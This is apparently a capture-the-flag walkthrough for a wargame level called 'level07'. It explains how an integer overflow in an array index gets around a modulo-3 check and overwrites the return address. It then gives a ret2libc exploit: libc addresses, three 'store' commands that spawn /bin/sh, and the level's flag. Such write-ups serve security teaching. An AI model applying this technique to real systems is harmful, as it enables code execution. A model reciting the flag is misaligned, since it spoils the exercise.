@@ -1,1 +1,28 @@
+# Level 07 Walkthrough
 
+## Vulnerability
+The `level07` binary is a number storage service. It allows storing numbers at specific indices in an array.
+It has a check to prevent writing to indices divisible by 3 (`index % 3 == 0`).
+However, it does not check for integer overflows when calculating the memory address.
+The address is calculated as `array_base + (index * 4)`.
+
+By providing a large index (`1073741938`), we can cause an integer overflow:
+`1073741938 * 4` overflows and wraps around to point to the return address (EIP) on the stack (specifically index 114).
+`1073741938 % 3` is 1, so it bypasses the check.
+
+## Exploit
+We perform a Ret2Libc attack:
+1.  Overwrite EIP (index 114 via overflow) with the address of `system()`.
+2.  Overwrite the argument for `system()` (index 116) with the address of the string `"/bin/sh"`.
+
+Addresses (found via GDB):
+- `system()`: `0xf7e6aed0` -> `4159090384`
+- `"/bin/sh"`: `0xf7f897ec` -> `4160264172`
+
+Commands:
+1.  `store 4159090384 1073741938` (Overwrites EIP with system)
+2.  `store 4160264172 116` (Sets argument to /bin/sh)
+3.  `quit` (Triggers return to system("/bin/sh"))
+
+## Flag
+`7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`
